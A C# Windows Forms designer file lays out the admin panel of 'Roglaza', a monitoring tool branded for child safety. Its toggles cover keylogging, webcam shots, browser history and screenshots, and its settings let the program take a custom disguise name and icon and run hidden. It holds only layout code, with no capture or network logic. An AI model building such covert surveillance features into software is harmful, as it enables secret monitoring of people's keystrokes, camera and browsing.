namespace Roglaza.Forms
{
    partial class FrmAdminPanel
    {
        /// <summary>
        /// Required designer variable.
        /// </summary>
        private System.ComponentModel.IContainer components = null;

        /// <summary>
        /// Clean up any resources being used.
        /// </summary>
        /// <param name="disposing">true if managed resources should be disposed; otherwise, false.</param>
        protected override void Dispose(bool disposing)
        {
            if (disposing && (components != null))
            {
                components.Dispose();
            }
            base.Dispose(disposing);
        }

        #region Windows Form Designer generated code

        /// <summary>
        /// Required method for Designer support - do not modify
        /// the contents of this method with the code editor.
        /// </summary>
        private void InitializeComponent()
        {
            this.components = new System.ComponentModel.Container();
            System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(FrmAdminPanel));
            this.timerWatcher = new System.Windows.Forms.Timer(this.components);
            this.label1 = new System.Windows.Forms.Label();
            this.numericUpDown_screenShotInterval = new System.Windows.Forms.NumericUpDown();
            this.panelBody = new System.Windows.Forms.Panel();
            this.button_Browse_logs_path = new System.Windows.Forms.Button();
            this.textBox_logsPath = new System.Windows.Forms.TextBox();
            this.label5 = new System.Windows.Forms.Label();
            this.buttonCancelUnistallation = new System.Windows.Forms.Button();
            this.buttonKill = new System.Windows.Forms.Button();
            this.panel_icon_Preview = new System.Windows.Forms.Panel();
            this.textBoxAppName = new System.Windows.Forms.TextBox();
            this.label3 = new System.Windows.Forms.Label();
            this.buttonBrwseicon = new System.Windows.Forms.Button();
            this.textBox_Icon_path = new System.Windows.Forms.TextBox();
            this.label2 = new System.Windows.Forms.Label();
            this.groupBox_Functions = new System.Windows.Forms.GroupBox();
            this.checkBoxScreenShots = new System.Windows.Forms.CheckBox();
            this.checkBoxCamShots = new System.Windows.Forms.CheckBox();
            this.checkBoxBrowserHistory = new System.Windows.Forms.CheckBox();
            this.checkBoxKeyLogger = new System.Windows.Forms.CheckBox();
            this.linkLabel_app_data_dir = new System.Windows.Forms.LinkLabel();
            this.linkLabelOpenLogsFolder = new System.Windows.Forms.LinkLabel();
            this.label_minutes = new System.Windows.Forms.Label();
            this.pictureBox_Spy = new System.Windows.Forms.PictureBox();
            this.labelBannerHidden = new System.Windows.Forms.Label();
            this.label_app_Name = new System.Windows.Forms.Label();
            this.label_Banner = new System.Windows.Forms.Label();
            this.panelContainer = new System.Windows.Forms.Panel();
            this.label4 = new System.Windows.Forms.Label();
            this.timerSession = new System.Windows.Forms.Timer(this.components);
            this.groupBoxMain = new System.Windows.Forms.GroupBox();
            ((System.ComponentModel.ISupportInitialize)(this.numericUpDown_screenShotInterval)).BeginInit();
            this.panelBody.SuspendLayout();
            this.groupBox_Functions.SuspendLayout();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox_Spy)).BeginInit();
            this.panelContainer.SuspendLayout();
            this.groupBoxMain.SuspendLayout();
            this.SuspendLayout();
            // 
            // timerWatcher
            // 
            this.timerWatcher.Enabled = true;
            this.timerWatcher.Interval = 300000;
            this.timerWatcher.Tick += new System.EventHandler(this.timerWatcher_Tick);
            // 
            // label1
            // 
            this.label1.AutoSize = true;
            this.label1.Location = new System.Drawing.Point(9, 16);
            this.label1.Name = "label1";
            this.label1.Size = new System.Drawing.Size(90, 13);
            this.label1.TabIndex = 0;
            this.label1.Text = "Take  Shot Every";
            // 
            // numericUpDown_screenShotInterval
            // 
            this.numericUpDown_screenShotInterval.Location = new System.Drawing.Point(144, 9);
            this.numericUpDown_screenShotInterval.Minimum = new decimal(new int[] {
            1,
            0,
            0,
            0});
            this.numericUpDown_screenShotInterval.Name = "numericUpDown_screenShotInterval";
            this.numericUpDown_screenShotInterval.Size = new System.Drawing.Size(58, 20);
            this.numericUpDown_screenShotInterval.TabIndex = 1;
            this.numericUpDown_screenShotInterval.Value = new decimal(new int[] {
            5,
            0,
            0,
            0});
            this.numericUpDown_screenShotInterval.ValueChanged += new System.EventHandler(this.numericUpDown_screenShotInterval_ValueChanged);
            // 
            // panelBody
            // 
            this.panelBody.Anchor = ((System.Windows.Forms.AnchorStyles)((((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Bottom) 
            | System.Windows.Forms.AnchorStyles.Left) 
            | System.Windows.Forms.AnchorStyles.Right)));
            this.panelBody.BackColor = System.Drawing.Color.Transparent;
            this.panelBody.Controls.Add(this.button_Browse_logs_path);
            this.panelBody.Controls.Add(this.textBox_logsPath);
            this.panelBody.Controls.Add(this.label5);
            this.panelBody.Controls.Add(this.buttonCancelUnistallation);
            this.panelBody.Controls.Add(this.buttonKill);
            this.panelBody.Controls.Add(this.panel_icon_Preview);
            this.panelBody.Controls.Add(this.textBoxAppName);
            this.panelBody.Controls.Add(this.label3);
            this.panelBody.Controls.Add(this.buttonBrwseicon);
            this.panelBody.Controls.Add(this.textBox_Icon_path);
            this.panelBody.Controls.Add(this.label2);
            this.panelBody.Controls.Add(this.groupBox_Functions);
            this.panelBody.Controls.Add(this.linkLabel_app_data_dir);
            this.panelBody.Controls.Add(this.linkLabelOpenLogsFolder);
            this.panelBody.Controls.Add(this.label_minutes);
            this.panelBody.Controls.Add(this.numericUpDown_screenShotInterval);
            this.panelBody.Controls.Add(this.label1);
            this.panelBody.Location = new System.Drawing.Point(3, 78);
            this.panelBody.Name = "panelBody";
            this.panelBody.Size = new System.Drawing.Size(763, 222);
            this.panelBody.TabIndex = 2;
            this.panelBody.VisibleChanged += new System.EventHandler(this.panel1_VisibleChanged);
            // 
            // button_Browse_logs_path
            // 
            this.button_Browse_logs_path.Location = new System.Drawing.Point(720, 151);
            this.button_Browse_logs_path.Name = "button_Browse_logs_path";
            this.button_Browse_logs_path.Size = new System.Drawing.Size(35, 23);
            this.button_Browse_logs_path.TabIndex = 15;
            this.button_Browse_logs_path.Text = "...";
            this.button_Browse_logs_path.UseVisualStyleBackColor = true;
            this.button_Browse_logs_path.Click += new System.EventHandler(this.button_Browse_logs_path_Click);
            // 
            // textBox_logsPath
            // 
            this.textBox_logsPath.Location = new System.Drawing.Point(108, 154);
            this.textBox_logsPath.Name = "textBox_logsPath";
            this.textBox_logsPath.ReadOnly = true;
            this.textBox_logsPath.Size = new System.Drawing.Size(605, 20);
            this.textBox_logsPath.TabIndex = 14;
            this.textBox_logsPath.TextChanged += new System.EventHandler(this.textBox1_TextChanged);
            // 
            // label5
            // 
            this.label5.AutoSize = true;
            this.label5.Location = new System.Drawing.Point(12, 160);
            this.label5.Name = "label5";
            this.label5.Size = new System.Drawing.Size(55, 13);
            this.label5.TabIndex = 13;
            this.label5.Text = "Logs Path";
            // 
            // buttonCancelUnistallation
            // 
            this.buttonCancelUnistallation.Location = new System.Drawing.Point(359, 181);
            this.buttonCancelUnistallation.Name = "buttonCancelUnistallation";
            this.buttonCancelUnistallation.Size = new System.Drawing.Size(138, 23);
            this.buttonCancelUnistallation.TabIndex = 12;
            this.buttonCancelUnistallation.Text = "Cancel unistalling";
            this.buttonCancelUnistallation.UseVisualStyleBackColor = true;
            this.buttonCancelUnistallation.Visible = false;
            this.buttonCancelUnistallation.Click += new System.EventHandler(this.buttonCancelUnistallation_Click);
            // 
            // buttonKill
            // 
            this.buttonKill.Location = new System.Drawing.Point(277, 181);
            this.buttonKill.Name = "buttonKill";
            this.buttonKill.Size = new System.Drawing.Size(75, 23);
            this.buttonKill.TabIndex = 11;
            this.buttonKill.Text = "Unistall";
            this.buttonKill.UseVisualStyleBackColor = true;
            this.buttonKill.VisibleChanged += new System.EventHandler(this.buttonKill_VisibleChanged);
            this.buttonKill.Click += new System.EventHandler(this.buttonKill_Click);
            // 
            // panel_icon_Preview
            // 
            this.panel_icon_Preview.Location = new System.Drawing.Point(82, 100);
            this.panel_icon_Preview.Name = "panel_icon_Preview";
            this.panel_icon_Preview.Size = new System.Drawing.Size(20, 21);
            this.panel_icon_Preview.TabIndex = 10;
            // 
            // textBoxAppName
            // 
            this.textBoxAppName.Location = new System.Drawing.Point(108, 127);
            this.textBoxAppName.Name = "textBoxAppName";
            this.textBoxAppName.Size = new System.Drawing.Size(605, 20);
            this.textBoxAppName.TabIndex = 9;
            this.textBoxAppName.TextChanged += new System.EventHandler(this.textBoxAppName_TextChanged);
            // 
            // label3
            // 
            this.label3.AutoSize = true;
            this.label3.Location = new System.Drawing.Point(12, 134);
            this.label3.Name = "label3";
            this.label3.Size = new System.Drawing.Size(77, 13);
            this.label3.TabIndex = 8;
            this.label3.Text = "Program Name";
            // 
            // buttonBrwseicon
            // 
            this.buttonBrwseicon.Location = new System.Drawing.Point(719, 98);
            this.buttonBrwseicon.Name = "buttonBrwseicon";
            this.buttonBrwseicon.Size = new System.Drawing.Size(36, 23);
            this.buttonBrwseicon.TabIndex = 7;
            this.buttonBrwseicon.Text = "...";
            this.buttonBrwseicon.UseVisualStyleBackColor = true;
            this.buttonBrwseicon.Click += new System.EventHandler(this.buttonBrwseicon_Click);
            // 
            // textBox_Icon_path
            // 
            this.textBox_Icon_path.Location = new System.Drawing.Point(108, 100);
            this.textBox_Icon_path.Name = "textBox_Icon_path";
            this.textBox_Icon_path.ReadOnly = true;
            this.textBox_Icon_path.Size = new System.Drawing.Size(605, 20);
            this.textBox_Icon_path.TabIndex = 6;
            this.textBox_Icon_path.TextChanged += new System.EventHandler(this.textBox_Icon_path_TextChanged);
            // 
            // label2
            // 
            this.label2.AutoSize = true;
            this.label2.Location = new System.Drawing.Point(11, 108);
            this.label2.Name = "label2";
            this.label2.Size = new System.Drawing.Size(28, 13);
            this.label2.TabIndex = 5;
            this.label2.Text = "Icon";
            // 
            // groupBox_Functions
            // 
            this.groupBox_Functions.Controls.Add(this.checkBoxScreenShots);
            this.groupBox_Functions.Controls.Add(this.checkBoxCamShots);
            this.groupBox_Functions.Controls.Add(this.checkBoxBrowserHistory);
            this.groupBox_Functions.Controls.Add(this.checkBoxKeyLogger);
            this.groupBox_Functions.Location = new System.Drawing.Point(12, 40);
            this.groupBox_Functions.Name = "groupBox_Functions";
            this.groupBox_Functions.Size = new System.Drawing.Size(743, 50);
            this.groupBox_Functions.TabIndex = 4;
            this.groupBox_Functions.TabStop = false;
            this.groupBox_Functions.Text = "Functions";
            // 
            // checkBoxScreenShots
            // 
            this.checkBoxScreenShots.AutoSize = true;
            this.checkBoxScreenShots.Location = new System.Drawing.Point(306, 19);
            this.checkBoxScreenShots.Name = "checkBoxScreenShots";
            this.checkBoxScreenShots.Size = new System.Drawing.Size(87, 17);
            this.checkBoxScreenShots.TabIndex = 0;
            this.checkBoxScreenShots.Text = "ScreenShots";
            this.checkBoxScreenShots.UseVisualStyleBackColor = true;
            this.checkBoxScreenShots.CheckedChanged += new System.EventHandler(this.checkBoxScreenShots_CheckedChanged);
            // 
            // checkBoxCamShots
            // 
            this.checkBoxCamShots.AutoSize = true;
            this.checkBoxCamShots.Location = new System.Drawing.Point(460, 19);
            this.checkBoxCamShots.Name = "checkBoxCamShots";
            this.checkBoxCamShots.Size = new System.Drawing.Size(77, 17);
            this.checkBoxCamShots.TabIndex = 0;
            this.checkBoxCamShots.Text = "Cam Shots";
            this.checkBoxCamShots.UseVisualStyleBackColor = true;
            this.checkBoxCamShots.CheckedChanged += new System.EventHandler(this.checkBoxCamShots_CheckedChanged);
            // 
            // checkBoxBrowserHistory
            // 
            this.checkBoxBrowserHistory.AutoSize = true;
            this.checkBoxBrowserHistory.Location = new System.Drawing.Point(156, 19);
            this.checkBoxBrowserHistory.Name = "checkBoxBrowserHistory";
            this.checkBoxBrowserHistory.Size = new System.Drawing.Size(99, 17);
            this.checkBoxBrowserHistory.TabIndex = 0;
            this.checkBoxBrowserHistory.Text = "Browser History";
            this.checkBoxBrowserHistory.UseVisualStyleBackColor = true;
            this.checkBoxBrowserHistory.CheckedChanged += new System.EventHandler(this.checkBoxBrowserHistory_CheckedChanged);
            // 
            // checkBoxKeyLogger
            // 
            this.checkBoxKeyLogger.AutoSize = true;
            this.checkBoxKeyLogger.Location = new System.Drawing.Point(17, 19);
            this.checkBoxKeyLogger.Name = "checkBoxKeyLogger";
            this.checkBoxKeyLogger.Size = new System.Drawing.Size(77, 17);
            this.checkBoxKeyLogger.TabIndex = 0;
            this.checkBoxKeyLogger.Text = "KeyLogger";
            this.checkBoxKeyLogger.UseVisualStyleBackColor = true;
            this.checkBoxKeyLogger.CheckedChanged += new System.EventHandler(this.checkBoxKeyLogger_CheckedChanged);
            // 
            // linkLabel_app_data_dir
            // 
            this.linkLabel_app_data_dir.AutoSize = true;
            this.linkLabel_app_data_dir.Location = new System.Drawing.Point(567, 195);
            this.linkLabel_app_data_dir.Name = "linkLabel_app_data_dir";
            this.linkLabel_app_data_dir.Size = new System.Drawing.Size(78, 13);
            this.linkLabel_app_data_dir.TabIndex = 3;
            this.linkLabel_app_data_dir.TabStop = true;
            this.linkLabel_app_data_dir.Text = "Open AppData";
            this.linkLabel_app_data_dir.LinkClicked += new System.Windows.Forms.LinkLabelLinkClickedEventHandler(this.linkLabel_app_data_dir_LinkClicked);
            // 
            // linkLabelOpenLogsFolder
            // 
            this.linkLabelOpenLogsFolder.AutoSize = true;
            this.linkLabelOpenLogsFolder.Location = new System.Drawing.Point(664, 195);
            this.linkLabelOpenLogsFolder.Name = "linkLabelOpenLogsFolder";
            this.linkLabelOpenLogsFolder.Size = new System.Drawing.Size(91, 13);
            this.linkLabelOpenLogsFolder.TabIndex = 3;
            this.linkLabelOpenLogsFolder.TabStop = true;
            this.linkLabelOpenLogsFolder.Text = "Open Logs Folder";
            this.linkLabelOpenLogsFolder.LinkClicked += new System.Windows.Forms.LinkLabelLinkClickedEventHandler(this.linkLabelOpenLogsFolder_LinkClicked);
            // 
            // label_minutes
            // 
            this.label_minutes.AutoSize = true;
            this.label_minutes.Location = new System.Drawing.Point(208, 16);
            this.label_minutes.Name = "label_minutes";
            this.label_minutes.Size = new System.Drawing.Size(43, 13);
            this.label_minutes.TabIndex = 2;
            this.label_minutes.Text = "minutes";
            // 
            // pictureBox_Spy
            // 
            this.pictureBox_Spy.Image = global::Roglaza.Properties.Resources.Spy;
            this.pictureBox_Spy.Location = new System.Drawing.Point(740, 7);
            this.pictureBox_Spy.Name = "pictureBox_Spy";
            this.pictureBox_Spy.Size = new System.Drawing.Size(18, 22);
            this.pictureBox_Spy.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
            this.pictureBox_Spy.TabIndex = 5;
            this.pictureBox_Spy.TabStop = false;
            this.pictureBox_Spy.Visible = false;
            // 
            // labelBannerHidden
            // 
            this.labelBannerHidden.AutoSize = true;
            this.labelBannerHidden.BackColor = System.Drawing.Color.Transparent;
            this.labelBannerHidden.Font = new System.Drawing.Font("Comic Sans MS", 36F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.labelBannerHidden.Location = new System.Drawing.Point(21, 325);
            this.labelBannerHidden.Name = "labelBannerHidden";
            this.labelBannerHidden.Size = new System.Drawing.Size(682, 67);
            this.labelBannerHidden.TabIndex = 4;
            this.labelBannerHidden.Text = "I\'M Hidden , Do you see me ?";
            this.labelBannerHidden.VisibleChanged += new System.EventHandler(this.labelBannerHidden_VisibleChanged);
            // 
            // label_app_Name
            // 
            this.label_app_Name.AutoSize = true;
            this.label_app_Name.Font = new System.Drawing.Font("Comic Sans MS", 28.25F);
            this.label_app_Name.ForeColor = System.Drawing.Color.DarkRed;
            this.label_app_Name.Location = new System.Drawing.Point(6, 7);
            this.label_app_Name.Name = "label_app_Name";
            this.label_app_Name.Size = new System.Drawing.Size(166, 53);
            this.label_app_Name.TabIndex = 3;
            this.label_app_Name.Text = "Roglaza ";
            // 
            // label_Banner
            // 
            this.label_Banner.AutoSize = true;
            this.label_Banner.Font = new System.Drawing.Font("Comic Sans MS", 11.25F);
            this.label_Banner.Location = new System.Drawing.Point(178, 40);
            this.label_Banner.Name = "label_Banner";
            this.label_Banner.Size = new System.Drawing.Size(178, 20);
            this.label_Banner.TabIndex = 3;
            this.label_Banner.Text = "keep Your Children Safe";
            // 
            // panelContainer
            // 
            this.panelContainer.Anchor = ((System.Windows.Forms.AnchorStyles)((((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Bottom) 
            | System.Windows.Forms.AnchorStyles.Left) 
            | System.Windows.Forms.AnchorStyles.Right)));
            this.panelContainer.BackColor = System.Drawing.Color.Transparent;
            this.panelContainer.Controls.Add(this.label4);
            this.panelContainer.Controls.Add(this.label_app_Name);
            this.panelContainer.Controls.Add(this.label_Banner);
            this.panelContainer.Controls.Add(this.panelBody);
            this.panelContainer.Location = new System.Drawing.Point(8, 19);
            this.panelContainer.Name = "panelContainer";
            this.panelContainer.Size = new System.Drawing.Size(769, 303);
            this.panelContainer.TabIndex = 4;
            this.panelContainer.Visible = false;
            // 
            // label4
            // 
            this.label4.AutoSize = true;
            this.label4.ForeColor = System.Drawing.Color.White;
            this.label4.Location = new System.Drawing.Point(18, 59);
            this.label4.Name = "label4";
            this.label4.Size = new System.Drawing.Size(703, 13);
            this.label4.TabIndex = 4;
            this.label4.Text = "_________________________________________________________________________________" +
    "___________________________________";
            // 
            // timerSession
            // 
            this.timerSession.Enabled = true;
            this.timerSession.Interval = 300000;
            this.timerSession.Tick += new System.EventHandler(this.timerSession_Tick);
            // 
            // groupBoxMain
            // 
            this.groupBoxMain.BackColor = System.Drawing.Color.Transparent;
            this.groupBoxMain.Controls.Add(this.pictureBox_Spy);
            this.groupBoxMain.Controls.Add(this.panelContainer);
            this.groupBoxMain.Controls.Add(this.labelBannerHidden);
            this.groupBoxMain.Location = new System.Drawing.Point(4, 2);
            this.groupBoxMain.Name = "groupBoxMain";
            this.groupBoxMain.Size = new System.Drawing.Size(790, 420);
            this.groupBoxMain.TabIndex = 5;
            this.groupBoxMain.TabStop = false;
            // 
            // FrmAdminPanel
            // 
            this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
            this.BackColor = System.Drawing.Color.White;
            this.BackgroundImage = global::Roglaza.Properties.Resources.Roglaza;
            this.ClientSize = new System.Drawing.Size(798, 427);
            this.Controls.Add(this.groupBoxMain);
            this.Icon = ((System.Drawing.Icon)(resources.GetObject("$this.Icon")));
            this.Name = "FrmAdminPanel";
            this.Opacity = 0.9D;
            this.Text = "Roglaza";
            this.WindowState = System.Windows.Forms.FormWindowState.Minimized;
            this.FormClosing += new System.Windows.Forms.FormClosingEventHandler(this.FrmAdminPanel_FormClosing);
            this.Load += new System.EventHandler(this.FrmAdminPanel_Load);
            this.VisibleChanged += new System.EventHandler(this.FrmAdminPanel_VisibleChanged);
            this.Resize += new System.EventHandler(this.FrmAdminPanel_Resize);
            ((System.ComponentModel.ISupportInitialize)(this.numericUpDown_screenShotInterval)).EndInit();
            this.panelBody.ResumeLayout(false);
            this.panelBody.PerformLayout();
            this.groupBox_Functions.ResumeLayout(false);
            this.groupBox_Functions.PerformLayout();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox_Spy)).EndInit();
            this.panelContainer.ResumeLayout(false);
            this.panelContainer.PerformLayout();
            this.groupBoxMain.ResumeLayout(false);
            this.groupBoxMain.PerformLayout();
            this.ResumeLayout(false);

        }

        #endregion

        private System.Windows.Forms.Timer timerWatcher;
        private System.Windows.Forms.Label label1;
        private System.Windows.Forms.NumericUpDown numericUpDown_screenShotInterval;
        private System.Windows.Forms.Panel panelBody;
        private System.Windows.Forms.Label label_app_Name;
        private System.Windows.Forms.Label label_Banner;
        private System.Windows.Forms.Panel panelContainer;
        private System.Windows.Forms.Label label_minutes;
        private System.Windows.Forms.LinkLabel linkLabelOpenLogsFolder;
        private System.Windows.Forms.Label labelBannerHidden;
        private System.Windows.Forms.GroupBox groupBox_Functions;
        private System.Windows.Forms.CheckBox checkBoxScreenShots;
        private System.Windows.Forms.CheckBox checkBoxCamShots;
        private System.Windows.Forms.CheckBox checkBoxBrowserHistory;
        private System.Windows.Forms.CheckBox checkBoxKeyLogger;
        private System.Windows.Forms.TextBox textBox_Icon_path;
        private System.Windows.Forms.Label label2;
        private System.Windows.Forms.Button buttonBrwseicon;
        private System.Windows.Forms.TextBox textBoxAppName;
        private System.Windows.Forms.Label label3;
        private System.Windows.Forms.Panel panel_icon_Preview;
        private System.Windows.Forms.Timer timerSession;
        private System.Windows.Forms.GroupBox groupBoxMain;
        private System.Windows.Forms.Label label4;
        private System.Windows.Forms.PictureBox pictureBox_Spy;
        private System.Windows.Forms.Button buttonKill;
        private System.Windows.Forms.Button buttonCancelUnistallation;
        private System.Windows.Forms.LinkLabel linkLabel_app_data_dir;
        private System.Windows.Forms.Button button_Browse_logs_path;
        private System.Windows.Forms.TextBox textBox_logsPath;
        private System.Windows.Forms.Label label5;

    }
}